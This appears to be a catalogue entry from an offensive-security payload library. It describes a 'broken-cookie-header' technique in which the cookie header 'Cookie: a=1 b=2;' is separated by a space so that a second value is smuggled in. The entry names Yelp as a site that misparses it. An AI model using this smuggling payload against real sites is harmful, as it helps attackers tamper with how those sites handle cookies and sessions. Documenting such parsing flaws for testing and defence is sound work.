---
data: 'Cookie: a=1 b=2;'
tags:
  - cookie-parsing
type: command
executor: bash
platforms:
  - Web
id: a339abf4-9b88-4838-a36c-35271c79b7ff
created_at: '2025-12-13T23:56:20.367Z'
updated_at: '2025-12-13T23:56:20.367Z'
verified: false
validated: true
submitted: true
---
# broken-cookie-header

## Command

```bash
Cookie: a=1 b=2;
```

## Description

Cookie header with space separation, exploiting broken parsing.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `a` | Value including smuggled part | Yes |

## Examples

### Basic Usage

```bash
Cookie: a=1 b=2;
```

## Expected Output

Parsed incorrectly as a=1 and b=2 by Yelp

## Related

- [[procedures/Exploit-Broken-Cookie-Parsing-for-Smuggling]]
